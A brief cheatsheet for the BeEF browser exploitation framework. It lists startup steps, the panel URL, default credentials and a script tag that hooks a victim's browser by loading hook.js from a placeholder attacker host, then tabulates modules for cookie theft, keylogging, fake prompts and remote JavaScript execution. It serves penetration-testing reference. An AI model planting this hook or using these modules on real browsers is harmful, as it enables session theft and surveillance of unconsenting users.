BeEF (Browser Exploitation Framework) Cheatsheet

  • BeEF is a penetration testing tool focused on web browsers.
  • Allows hooking browsers and controlling them through command modules.
  • Used to demonstrate browser vulnerabilities and social engineering attacks.
  • Start BeEF: ./beef (run inside the BeEF directory)
  • Access web UI: http://localhost:3000/ui/panel
  • Default creds: beef / beef
  • Hook a browser by including the JS hook: <script src="http://<beef_ip>:3000/hook.js"></script>
  • Use the web interface to run modules against hooked browsers.
ModuleDescription
Get CookiesRetrieve cookies from hooked browser.
KeyloggerLog keystrokes in the browser.
Social EngineeringDisplay fake alerts, prompt user actions.
Network InfoGather info about network and browser.
Command ExecutionRun JavaScript commands remotely.
  • Only use on authorized targets to avoid legal issues.
  • Use social engineering modules to demonstrate real attack vectors.
  • Update BeEF regularly for latest modules and fixes.
  • Combine with other tools for a full assessment.
